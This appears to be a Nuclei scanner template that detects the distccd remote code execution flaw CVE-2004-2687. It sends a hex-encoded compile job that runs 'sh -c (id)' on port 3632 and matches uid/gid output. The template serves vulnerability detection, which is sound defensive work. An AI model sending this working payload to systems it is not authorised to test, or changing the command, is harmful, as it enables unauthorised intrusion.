id: CVE-2004-2687
info:
  author: pussycat0x
  classification:
    cpe: cpe:2.3:a:apple:xcode:1.5:*:*:*:*:*:*:*
    cve-id: CVE-2004-2687
    cvss-metrics: CVSS:2.0/AV:N/AC:M/Au:N/C:C/I:C/A:C
    cvss-score: 9.3
    cwe-id: CWE-16
    epss-percentile: 0.99194
    epss-score: 0.94037
  description: 'distcc 2.x, as used in XCode 1.5 and others, when not configured to
    restrict access to the server port, allows remote attackers to execute arbitrary
    commands via compilation jobs, which are executed by the server without authorization
    checks.

    '
  metadata:
    max-request: 1
    verified: true
  name: Distccd v1 - Remote Code Execution
  reference:
  - http://distcc.samba.org/security.html
  - http://lists.samba.org/archive/distcc/2004q3/002550.html
  - http://lists.samba.org/archive/distcc/2004q3/002562.html
  - https://github.com/crypticdante/distccd_rce_CVE-2004-2687
  - https://github.com/gwyomarch/Lame-HTB-Writeup-FR
  severity: high
  tags: cve,cve2004,network,rce,distccd
tcp:
- host:
  - '{{Hostname}}'
  inputs:
  - data: 444953543030303030303031
    type: hex
  - data: 41524743303030303030303841524756303030303030303273684152475630303030303030322d634152475630303030303030637368202d6320272869642927415247563030303030303031234152475630303030303030322d634152475630303030303030366d61696e2e634152475630303030303030322d6f4152475630303030303030366d61696e2e6f444f5449303030303030303141
    type: hex
  matchers:
  - part: raw
    regex:
    - uid=[0-9]+.*gid=[0-9]+.*
    type: regex
  port: 3632
